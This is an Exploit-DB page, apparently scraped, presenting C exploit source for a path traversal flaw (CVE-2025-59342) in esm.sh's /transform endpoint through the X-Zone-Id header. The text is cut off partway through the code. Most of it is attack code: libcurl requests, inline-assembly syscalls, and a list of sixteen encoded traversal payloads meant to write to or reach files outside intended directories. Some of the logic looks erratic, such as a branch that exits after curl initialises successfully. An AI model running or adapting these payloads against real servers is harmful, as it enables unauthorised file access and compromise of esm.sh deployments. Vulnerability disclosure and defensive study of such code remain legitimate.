---
title: [webapps] esm-dev 136 - Path Traversal
url: https://www.exploit-db.com/exploits/52461
source: Exploit-DB.com RSS Feed
date: 2025-12-16
fetch_date: 2025-12-17T03:18:46.226769
---

# [webapps] esm-dev 136 - Path Traversal

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# esm-dev 136 - Path Traversal

#### EDB-ID:

###### 52461

#### CVE:

###### [2025-59342](https://nvd.nist.gov/vuln/detail/CVE-2025-59342)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-12-16

---

**Vulnerable App:**

```
# Exploit Title:  esm-dev 136 - Path Traversal
# Date: 2025-07-11
# Exploit Author: Byte Reaper
#Vendor Homepage: https://github.com/esm-dev/esm.sh
# Software Link: https://github.com/esm-dev/esm.sh
# CVE-2025-59342
 - File   : exploit.c
 - Date   : 09/17/2025
 - Target : esm-dev
 - Version: 136
 - Target Endpoint : /transform
 - Target Header   :  X-Zone-Id
 - Vuln :
 - Run exploit :
            # gcc exploit.c argparse.c -o CVE-2025-59342 -lcurl
            # ./CVE-2025-59342

#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>
#include "argparse.h"
#include <time.h>
#include <unistd.h>
#include <sys/utsname.h>
#define FULL_URL 2500
#define P_Y      2000
#define POST_DATA 9000
int flagPort = 0;
int port = 80;
int selectPort = -1;
int verbose = 0;
int code = 1;
int found = 1;
int cF = 0;
int s = 0;
int bY = 0;
int sP = 0;
const char* cookies = NULL;
const char* payload = NULL;
void exit64bit()
{
    int n = 0;
    __asm__ volatile
        (
            "mov $0x4A, %%rax\n\t"
            "mov $0x1, %%rdi\n\t"
            "syscall\n\t"
            "test %%rax, %%rax\n\t"
            "jz .aD\n\t"
            "mov $0x0, %[var]\n\t"
            "jmp .finish\n\t"
            ".aD:\n\t"
            "mov $0x1, %[var]\n\t"
            ".finish:\n\t"
            : [var] "+r" (n)
            :
            : "rax",
            "rdi"
            );
    if (n == 0)
    {
        printf("\e[0;31m[-] sys_fsync syscall Faild.\n");
        fflush(stdout);
    }
    else if (n == 1)
    {
        printf("[+] sys_fsync syscall Success.\n");
    }

    __asm__ volatile
        (
            "mov $0x0, %%rdi\n\t"
            "mov $0x3C, %%rax\n\t"
            "syscall\n\t"
            :
            :
            : "rax",
              "rdi"
        );
}

struct Mem
{
    char* buffer;
    size_t len;
};
size_t write_cb(void* ptr, size_t size, size_t nmemb, void* userdata)
{
    size_t total = size * nmemb;
    struct Mem* m = (struct Mem*)userdata;
    char* tmp = realloc(m->buffer, m->len + total + 1);
    if (!tmp) return 0;
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}

int checkLen(int len, char* buf, size_t bufcap)
{
    if (len < 0 || (size_t)len >= bufcap)
    {
        printf("\e[0;31m[-] Len is Long ! \e[0m\n");
        printf("\e[0;31m[-] Len %d\e[0m\n", len);
        return 1;
    }
    else
    {
        printf("\e[0;34m[+] Len Is Not Long.\e[0m\n");
        return 0;

    }
    return 0;
}

const char* payloads[] =
{
    "..//..//modules//transform//c245626ef6ca0fd9ee37759c5fac606c6ec99daa//",
    "..../..../m.o.d.u.les/transform/c245626ef6ca0fd9ee37759c5fac606c6ec99daa/",
    "..\\/..\\/modules\\/transform\\/c245626ef6ca0fd9ee37759c5fac606c6ec99daa\\/",
    ".//.//m?odu?le?s/tran.sfo.rm/c245626ef6ca0fd9ee37759c5fac606c6ec99daa/",
    "..%252f%252f..%252f%252fmodules%252f%252ftransform%252f%252fc245626ef6ca0fd9ee37759c5fac606c6ec99daa%252f",
    "%252e%252e%252f%252f%252e%252e%252f%252fmodules%252f%252ftransform%252f%252fc245626ef6ca0fd9ee37759c5fac606c6ec99daa%252f",
    "..%2f%2f..modules%2f%2ftransform%2f%2fc245626ef6ca0fd9ee37759c5fac606c6ec99daa%2f",
    "%2e%2e%2f%2f%2e%2emodules%2f%2ftransform%2f%2fc245626ef6ca0fd9ee37759c5fac606c6ec99daa%2f",
    "..%255c%255c..%255c%255cmodules%255c%255ctransform%255c%255cc245626ef6ca0fd9ee37759c5fac606c6ec99daa%255c%255c",
    "%252e%252e%255c%255c%252e%252e%255c%255cmodules%255c%255ctransform%255c%255cc245626ef6ca0fd9ee37759c5fac606c6ec99daa%255c%255c",
    "%u002e%u002e%u2215%u2215%u002e%u002e%u2215%u2215modules%u002e%u002etransform%u002e%u002ec245626ef6ca0fd9ee37759c5fac606c6ec99daa%u002e",
    "%u002e%u002e%u2216%u2216%u002e%u002e%u2216%u2216modules%u2216%u2216transform%u2216%u2216c245626ef6ca0fd9ee37759c5fac606c6ec99daa%u2216",
    "%e0%40%ae%e0%40%ae%e0%80%af%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%80%afmodules%e0%80%af%e0%80%aftransform%e0%80%af%e0%80%afc245626ef6ca0fd9ee37759c5fac606c6ec99daa%e0%80%af",
    ".%00.//.%00.//modules//transform//c245626ef6ca0fd9ee37759c5fac606c6ec99daa/",
    "..;//..;//modules//transform//c245626ef6ca0fd9ee37759c5fac606c6ec99daa/",
    "%c0%2e%c0%2e%c0%af%c0%af%c0%2e%c0%2e%c0%af%c0%afmodules%c0%af%c0%aftransform%c0%af%c0%afc245626ef6ca0fd9ee37759c5fac606c6ec99daa%c0%af",
    NULL

};

static void request(const char *baseurl)
{
    CURL* curl = curl_easy_init();
    const char *mes3 = "\e[0;34m[+] Create Object CURL Success.\n";
    const char *mes4 = "\e[0;31m[-] Error Create Object CURL !\e[0m\n";
    size_t len3 = strlen(mes3);
    size_t len4 = strlen(mes4);
    __asm__ volatile
        (
            "cmp $0x0,    %[curlO]\n\t"
            "je .donV\n\t"
            ".erD:\n\t"
            "mov $0x1,    %%rax\n\t"
            "mov $0x1,    %%rdi\n\t"
            "mov %[msg], %%rsi\n\t"
            "mov %[len], %%rdx\n\t"
            "syscall\n\t"
            "jmp .finishC\n\t"
            ".donV:\n\t"
            "mov $0x1,    %%rax\n\t"
            "mov $0x1,    %%rdi\n\t"
            "mov %[msg1], %%rsi\n\t"
            "mov %[len1], %%rdx\n\t"
            "syscall\n\t"
            "xor %%rdi,   %%rdi\n\t"
            "mov $0x3C,   %%rax\n\t"
            "syscall\n\t"
            ".finishC:\n\t"
            :
            : [curlO] "r" (curl),
              [msg]   "r" ((const char *)mes3),
              [len]   "r" ((long)len3),
              [msg1]  "r" ((const char*)mes4),
              [len1]  "r" ((long)len4)
            : "rax",
              "rdi",
              "rsi",
              "rdx",
              "rcx",
              "r11",
              "memory"
        );
    struct Mem response;
    CURLcode res;
    response.buffer = NULL;
    response.len = 0;
    const char* mes5 = "\e[0;34m[+] Buffer Clean Success.\e[0m\n";
    size_t len5 = strlen(mes5);
    __asm__ volatile (
        "test %[buffer], %[buffer]\n\t"
        "jz  L_print_clean\n\t"
        "L_continue:\n\t"
        "jmp L_done\n\t"
        "L_print_clean:\n\t"
        "mov $0x1, %%rax\n\t"
        "mov $0x1, %%rdi\n\t"
        "movq %[msg13], %%rsi\n\t"
        "mov %[len13], %%rdx\n\t"
        "syscall\n\t"
        "L_done:\n\t"
        :
        : [buffer] "r" ((const char*)response.buffer),
        [msg13]    "r" (mes5),
        [len13]  "r" (len5)
        : "rax",
        "rdi",
        "rsi",
        "rdx",
        "rcx",
        "r11",
        "memory"
        );
    char full[FULL_URL];

	if (flagPort != 0)
	{
        const char* mes8 = "\e[0;31m[-] Select Port is NULL !\e[0m\n";
        size_t len8 = strlen(mes8);
        __asm__ volatile (
            "test %[var22], %[var22]\n\t"
            "jnz L_finish\n\t"
            "mov $1, %%rax\n\t"
            "mov $1, %%rdi\n\t"
            "mov %[msg13], %%rsi\n\t"
            "mov %[len13], %%rdx\n\t"
            "syscall\n\t"
            "xor %%rdi, %%rdi\n\t"
            "mov $0x3C, %%rax\n\t"
            "syscall\n\t"
            "L_finish:\n\t"
            :
            : [var22] "r" (selectPort),
        ...